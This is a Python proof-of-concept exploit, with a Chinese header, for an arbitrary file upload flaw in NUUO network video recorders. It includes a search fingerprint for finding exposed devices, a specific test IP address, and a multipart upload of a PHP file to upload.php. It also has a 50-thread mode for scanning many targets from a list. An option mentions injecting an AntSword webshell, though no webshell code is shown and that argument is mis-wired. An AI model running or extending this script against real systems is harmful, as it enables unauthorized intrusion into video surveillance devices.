"""
链接：https://mp.weixin.qq.com/s/I-3t2xcHSIT6VpEvHsrFlQ
介绍：NUUO网络视频录像机 upload.php 存在任意文件上传漏洞
指纹：title="Network Video Recorder Login"
测试： https://79.58.71.209
"""
import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def check(target):
    url = f"{target}/upload.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=--------ok4o88lom'
    }
    # 注意缩进
    data = """----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="test.php"

    <?php phpinfo();@unlink(__FILE__);?>
    ----------ok4o88lom--"""

    try:
        response = requests.post(url=url, data=data, headers=headers, verify=False)
        if response.status_code == 200 and 'test.php' in response.text:
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


def main():
    parse = argparse.ArgumentParser(description="NUUO摄像头文件上传漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    parse.add_argument('-exp', '--exploit', dest='file', type=str, help='注入蚁剑Webshell')
    # 实例化
    args = parse.parse_args()
    pool = Pool(50)
    if args.url:
        if 'http' in args.url:
            check(args.url)

        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)

            else:
                target = f"http://{target}"
                targets.append(target)

        pool.map(check, targets)
        pool.close()


if __name__ == '__main__':
    main()
